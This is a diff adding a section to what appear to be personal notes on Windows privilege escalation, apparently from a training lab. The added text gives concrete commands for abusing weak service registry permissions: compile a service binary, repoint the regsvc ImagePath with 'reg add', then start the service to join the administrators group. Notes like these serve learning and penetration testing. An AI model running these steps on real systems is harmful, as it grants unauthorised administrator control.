@@ -64,6 +64,21 @@ HERE'S HOW I APPROACH FOR ESCALATING PRIVILEDGES:
  
             You will see that interactive has full control this means we can modify the registry with our own version
             
+ ![Service_registry_2](https://user-images.githubusercontent.com/55708909/92689485-b6f0da00-f35c-11ea-9cad-7217f4876374.png)
+             
+             Compile the file using this command: x86_64-w64-mingw32-gcc windows_service.c -o x.exe
+             
+             Transfer the x.exe file to C:\Temp directory and use the following command to make it work
+             
+             reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
+             
+             You will see you will be added to administrator group
+             
+             sc start regsvc
+             
+![Service_registry_3](https://user-images.githubusercontent.com/55708909/92689754-3c748a00-f35d-11ea-9514-d905b1245dc0.png)
+             
+             
 4- Services( Executable files):
 ---------------------------------------------------------------------------------------------
           
